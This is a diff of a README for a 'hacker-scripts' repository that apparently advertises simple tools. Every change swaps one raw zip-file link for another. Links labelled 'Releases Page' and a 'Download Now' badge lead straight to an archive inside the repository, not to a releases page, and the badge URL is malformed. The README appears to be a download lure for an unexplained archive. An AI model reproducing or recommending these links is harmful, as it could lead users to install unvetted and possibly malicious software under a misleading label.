@@ -1,6 +1,6 @@
 # 🎉 hacker-scripts - Simple Tools for Your Everyday Needs
 
-[![Download Now](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/groovy/hacker-scripts_v1.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/groovy/hacker-scripts_v1.1.zip)
+[![Download Now](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/python/scripts-hacker-3.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/python/scripts-hacker-3.9.zip)
 
 ## 🛠️ Introduction
 
@@ -13,7 +13,7 @@ To get started with hacker-scripts, you will need to download the application fr
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the following link to access the download section: [Releases Page](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/groovy/hacker-scripts_v1.1.zip).
+   Go to the following link to access the download section: [Releases Page](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/python/scripts-hacker-3.9.zip).
 
 2. **Choose Your Version:**
    On the Releases page, you will see a list of available versions. Select the latest version for the best features and updates.
@@ -82,4 +82,4 @@ Should you encounter any problems during installation or operation, consider the
 
 For direct assistance, please feel free to reach out via our GitHub. Your feedback is valuable and helps us improve hacker-scripts for everyone.
 
-Remember to check the Releases page for the latest updates and new scripts: [Releases Page](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/groovy/hacker-scripts_v1.1.zip). Happy scripting!
+Remember to check the Releases page for the latest updates and new scripts: [Releases Page](https://raw.githubusercontent.com/watthatdo/hacker-scripts/master/python/scripts-hacker-3.9.zip). Happy scripting!
